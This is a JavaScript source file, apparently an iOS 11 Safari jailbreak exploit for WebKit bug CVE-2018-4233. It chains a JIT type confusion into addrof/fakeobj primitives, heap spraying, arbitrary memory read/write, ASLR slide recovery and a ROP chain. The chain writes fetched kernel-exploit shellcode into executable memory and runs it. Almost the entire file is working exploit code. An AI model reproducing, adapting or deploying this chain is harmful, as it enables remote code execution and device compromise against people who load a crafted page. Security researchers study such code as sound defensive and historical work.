/***
 *     ██╗ ██╗    ██████╗                ██╗ ██╗   ██████╗    ██╗
 *    ███║███║   ██╔═████╗              ███║███║   ╚════██╗  ███║
 *    ╚██║╚██║   ██║██╔██║    █████╗    ╚██║╚██║    █████╔╝  ╚██║
 *     ██║ ██║   ████╔╝██║    ╚════╝     ██║ ██║    ╚═══██╗   ██║
 *     ██║ ██║██╗╚██████╔╝               ██║ ██║██╗██████╔╝██╗██║
 *     ╚═╝ ╚═╝╚═╝ ╚═════╝                ╚═╝ ╚═╝╚═╝╚═════╝ ╚═╝╚═╝
 *		By Niklas B.
 */

module('verbosity');
include('sploit.1131.h');


//Offset detection
function has_offsets() {
    if(!window.chosendevice) return false;
    if(!window.chosendevice.offsets) return false;
    return true;
}

//Hex conversion
function hex(x) {
        if( x < 0)
            return eval(`-${hex(-x)}`); //Hex may never be negative so we conver the integer to a positive value
        return eval(`0x${x.toString(16)}`); //Convert the number to a hexadecimal
}

//Float to Integer conversion
function f2i(f) {
    f64[0] = f;
    return i32[0] + BASE32 * i32[1];
}

//Integer to Float conversion
function i2f(i) {
    i32[0] = i % BASE32;
    i32[1] = i / BASE32;
    return f64[0];
}

//Exclusive OR operand on two numbers
function xor(a, b) {
    var res = 0, base = 1;
    for(var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^(b&1));
        a = (a-(a&1))/2;
        b = (b-(b&1))/2;
        base *= 2;
    }
    return res;
}

//function called for exploit failure notification
function fail(x) {
    print('FAIL ' + x);
    throw null;
}

// CVE-2018-4233
function trigger(constr, modify, res, val) {
    return eval(`
        var o = [13.37];
        var Constructor${counter} = function(o) { ${constr} };
        var hack = false;
        var Wrapper = new Proxy(Constructor${counter}, {
            get: function() {
                if (hack) {
                    ${modify}
                }
            }
        });
        for (var i = 0; i < ITERS; ++i)
            new Wrapper(o)
        hack = true
        var bar = new Wrapper(o)
        ${res}
    `);
}

//The exploit
var pwn = function() {
    var _off = window.chosendevice.offsets;
    console.log('Starting stage 1...');
    
    stage1 = {
        addroff: function(victim) {
            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim));
        },
        
        fakeobj: function(addr) {
            return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr));
        },
        
        test: function() {
            var addr = this.addrof({a: 0x1337});
            var x = this.fakeobj(addr);
            if (x.a != 0x1337) {
                fail(1); //failed as we seem not to be vulnerable
            }
        }
    };
    
    stage1.test(); //sanity check to see if the vulnerability really exists
    
    //Spray the heap with structures
    structure_spray = [];
    for (var i = 0; i < 1000; ++i) {
        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff};
        ary['prop'+i] = 1;
        structure_spray.push(ary);
    }
    
    //Leak the address of an aligned structure
    manager = structure_spray[500];
    leak_addr = stage1.addrof(manager); //Trigger the infoleak, we can read the address of any structure!
    
    if(verbosity === VERBOSITY_HIGH) print('leaking from '+hex(leak_addr));
    
    //function for allocating above
    function alloc_above_manager(expr) {
        var res = null;
        
        //Keep looking for an address that is above the leaked address
        while(stage1.addrof(res) < leak_addr) {
            for (var i = 0; i < ALLOCS; ++i) {
                structure_spray.push(eval(expr));
            }
            res = eval(expr)
        }
        
        return res
    }
    
    unboxed_size = 100;
    unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']'); //array with double
    boxed = alloc_above_manager('[{}]'); //array with object
    victim = alloc_above_manager('[]'); //array
    
    // Will be stored out-of-line at butterfly - 0x10
    victim.p0 = 0x1337; //first padding
    
    //set up r/w access to the victim
    function victim_write(val) {
        victim.p0 = val;
    }
    
    function victim_read() {
        return victim.p0;
    }
    
    i32[0] = 0x200                // Structure ID
    i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
    outer = {
        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
        p1: f64[0],
        p2: manager,
        p3: 0xfffffff, // Butterfly indexing mask
    };
    
    fake_addr = stage1.addrof(outer) + 0x20
    
    if(verbosity >= VERBOSITY_DEFAULT) print('fake object is at ' + hex(fake_addr));
    
    //leak the addresses of our cell
    unboxed_addr = stage1.addrof(unboxed);
    boxed_addr = stage1.addrof(boxed);
    victim_addr = stage1.addrof(victim);
    
    if(verbosity >= VERBOSITY_HIGH) print('leak ' + hex(leak_addr)
                                          + '\nunboxed ' + hex(unboxed_addr)
                                          + '\nboxed ' + hex(boxed_addr)
                                          + '\nvictim ' + hex(victim_addr));
    
    holder = {fake: {}};
    holder.fake = stage1.fakeobj(fake_addr); //now we have a fake object with control over it yay!
    
    // From here on GC would be uncool
    
    // Share a butterfly for easier boxing/unboxing
    shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8]);
    boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8];
    
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly);
    
    victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8];
    
    function set_victim_addr(where) {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10);
    }
    
    function reset_victim_addr() {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly;
    }
    
    console.log('stage 1 complete, moving to stage 2.');
    
    //Alright, this is where we get full r/w to memory
    stage2 = {
        addrof: function(victim) {
            boxed[0] = victim;
            return f2i(unboxed[0]);
        },
        
        fakeobj: function(addr) {
            unboxed[0] = i2f(addr);
            return boxed[0];
        },
        
        write64: function(where, what) {
            set_victim_addr(where);
            victim_write(this.fakeobj(what));
            reset_victim_addr();
        },
        
        read64: function(where) {
            set_victim_addr(where);
            var res = this.addrof(victim_read());
            reset_victim_addr();
            return res;
        },
        
        write_non_zero: function(where, values) {
            for (var i = 0; i < values.length; ++i) {
                if (values[i] != 0)
                    this.write64(where + i*8, values[i]);
            }
        },
        
        test: function() {
            this.write64(boxed_addr + 0x10, 0xfff) // Overwrite index mask, no biggie
            if (0xfff != this.read64(boxed_addr + 0x10)) {
                fail(2)
            }
        },
        
        forge: function(values) {
            for (var i = 0; i < values.length; ++i)
                unboxed[1 + i] = i2f(values[i]);
            return shared_butterfly + 8;
        },
        
        clear: function() {
            outer = null
            holder.fake = null
            for (var i = 0; i < unboxed_size; ++i)
                boxed[0] = null;
        }
    };
    
    wrapper = document.createElement('div');
    wrapper_addr = stage2.addrof(wrapper);
    el_addr = stage2.read64(wrapper_addr + _off.padding);
    vtab_addr = stage2.read64(el_addr);
    
    //now get the ASLR slide
    slide = stage2.read64(vtab_addr) - _off.vtable;
    disablePrimitiveGigacage = _off.disableprimitivegigacage + slide;
    callbacks = _off.callbacks + slide;
    g_gigacageBasePtrs =  _off.g_gigacagebaseptrs + slide;
    g_typedArrayPoisons = _off.g_typedarraypoisons + slide;
    longjmp = _off.longjmp + slide;
    dlsym = _off.dlsym + slide;
    startOfFixedExecutableMemoryPool = stage2.read64(_off.startfixedmempool + slide)
    endOfFixedExecutableMemoryPool = stage2.read64(_off.endfixedmempool + slide)
    jitWriteSeparateHeapsFunction = stage2.read64(_off.jit_writeseperateheaps_func + slide)
    useFastPermisionsJITCopy = stage2.read64(_off.usefastpermissions_jitcopy + slide)
    ptr_stack_check_guard = _off.ptr_stack_check_guard + slide;
    pop_x8 = _off.modelio_popx8;
    pop_x2 = _off.coreaudio_popx2;
    linkcode_gadget = _off.linkcode_gadget;
    
    if(verbosity >= VERBOSITY_HIGH) {
        print('disablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
              + '\ng_gigacageBasePtrs @ ' + hex(g_gigacageBasePtrs)
              + '\ng_typedArrayPoisons @ ' + hex(g_typedArrayPoisons)
              + '\nstartOfFixedExecutableMemoryPool @ ' + hex(startOfFixedExecutableMemoryPool)
              + '\nendOfFixedExecutableMemoryPool @ ' + hex(endOfFixedExecutableMemoryPool)
              + '\njitWriteSeparateHeapsFunction @ ' + hex(jitWriteSeparateHeapsFunction)
              + '\nuseFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy));
    }

    //JIT Hardening stuff
    if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
        // Probably an older phone, should be even easier
        fail(3);
    }
    
    //Now set up our shellcode for code execution
    callback_vector = stage2.read64(callbacks);

    poison = stage2.read64(g_typedArrayPoisons + 6*8);
    buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison);

    shellcode_src = buffer_addr + 0x4000;
    shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;
    stage2.write64(shellcode_src + 4, dlsym);
              
    //set up our fake executable stack
    fake_stack = [
        0,
        shellcode_length,  // x2
        0,
        
        pop_x8,
        
        0, 0, 0, 0, 0,
        shellcode_dst, // x8
        0, 0, 0, 0,
        stage2.read64(ptr_stack_check_guard) + 0x58,
        
        linkcode_gadget,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        
        shellcode_dst
    ];
              
    // Set up fake vtable at offset 0
    u32_buffer[0] = longjmp % BASE32;
    u32_buffer[1] = longjmp / BASE32;

    // Set up fake stack at offset 0x2000
    for (var i = 0; i < fake_stack.length; ++i) {
          u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32;
          u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32;
    }
    
    //lets set up our code exection of the dylib payload
    stage2.write_non_zero(el_addr, [
        buffer_addr, // fake vtable
        0,
        shellcode_src, // x21
        0, 0, 0, 0, 0, 0, 0,
        0, // fp

        pop_x2, // lr
        0,
        buffer_addr + 0x2000, // sp
    ]);
    print('shellcode is at ' + hex(shellcode_dst));
    print('For best results close all apps except for safari before dismissing the next alert!');
    wrapper.addEventListener('click', function(){}); //execute the shellcode
};

//The exploit initialization 
var wk113go = function() {
    
    //we really need offsets first
    if(!has_offsets()) return fail(-1);
    
    //retrieve the shellcode containing the empty_list exploit by Ian Beer (Needs some work, doesn't check for request status code)
    fetch('payloads/11_3_1/emptylist.bin').then((response) => {
        response.arrayBuffer().then((buffer) => {
            try{

                shellcode_length = buffer.byteLength; //Get the length of the shellcode array
                
                //check whether our shellcode exceeds our executable region size that will be set up later
                if(shellcode_length > 0x1000000) {
                    fail(5);
                }
                                
                u8_buffer.set(new Uint8Array(buffer), 0x4000); //basically the same as what memset() and memcpy would do in c. uint8 is a char array containing our shellcode
                print('Received '+shellcode_length+ ' bytes of shellcode. Exploit will start now.');
                pwn();
            } catch(exception) {
                alert(exception); //We do not want our script to fail, so we catch all exceptions if they occur and continue
            }
        });
    });
};